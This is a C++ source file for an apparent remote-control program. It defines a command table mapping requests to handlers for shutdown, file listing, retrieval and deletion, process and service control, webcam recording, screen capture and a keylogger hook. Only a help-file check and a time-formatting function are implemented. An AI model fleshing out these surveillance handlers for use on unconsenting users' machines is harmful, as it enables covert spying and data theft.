#include "services.h"

namespace Services {
    std::map<std::pair<std::string, std::string>, std::vector<std::string>(*)(Command)> servicesMap {
        {{"help", "get"},            &getHelp},
        // {{"IP", "get"},              &getIP},
        {{"system", "shutdown"},     &shutdown}, 
        {{"system", "restart"},      &restart},
        {{"file", "list"},           &listFileAndFolder},
        {{"file", "delete"},         &deleteFile},
        {{"file", "get"},            &getFile},
        {{"application", "list"},    &listApplications},
        {{"application", "start"},   &startApplication},
        {{"application", "stop"},    &stopApplication},
        {{"service", "list"},        &listServices},
        {{"service", "start"},       &startService},
        {{"service", "stop"},        &stopService},
        {{"webcam", "record"},       &webcamRecord},
        {{"screen", "capture"},      &screenShot},
        {{"keylogger", "hook"},      &keyLogger}
    };
};

bool Services::getHelp(std::string &help) {
    help = "FAIL to get HELP!";
    
    std::ifstream fin("Help.txt");
    if (!fin.is_open())
        return false;
    fin.close();
    help = "Help.txt";
    return true;
}

std::vector<std::string> Services::getHelp(Command command) {
    std::string help = "FAIL to get HELP!";
    Services::getHelp(help);
    return std::vector<std::string> ({help});
}

std::string Services::getCurrentTimeString() {
    auto now = std::chrono::system_clock::now();                      // Get current time
    std::time_t currentTime = std::chrono::system_clock::to_time_t(now); // Convert to time_t
    std::tm localTime = *std::localtime(&currentTime);                // Convert to local time
    
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%Y-%m-%d %H:%M:%S");            // Format time as string
    return oss.str();
}